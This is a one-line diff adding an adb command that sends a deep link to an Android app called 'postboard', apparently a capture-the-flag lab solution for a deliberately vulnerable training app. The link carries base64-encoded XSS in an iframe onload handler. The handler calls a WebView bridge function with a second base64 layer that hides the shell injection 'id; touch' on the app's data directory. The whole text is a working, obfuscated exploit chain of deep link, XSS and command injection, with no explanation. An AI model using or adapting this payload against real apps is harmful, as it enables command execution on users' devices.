@@ -1,0 +1,1 @@
+adb shell am start -a android.intent.action.VIEW -d "postboard://postmessage/PGlmcmFtZSBvbmxvYWQ9d2luZG93LldlYkFwcEludGVyZmFjZS5wb3N0Q293c2F5TWVzc2FnZShhdG9iKCJhV1E3SUhSdmRXTm9JQzlrWVhSaEwyUmhkR0V2WTI5dExtMXZZbWxzWldoaFkydHBibWRzWVdJdWNHOXpkR0p2WVhKa0wyWnBiR1Z6TDJsdVpYSnphVzRnSXc9PSIpKSAvPg=="
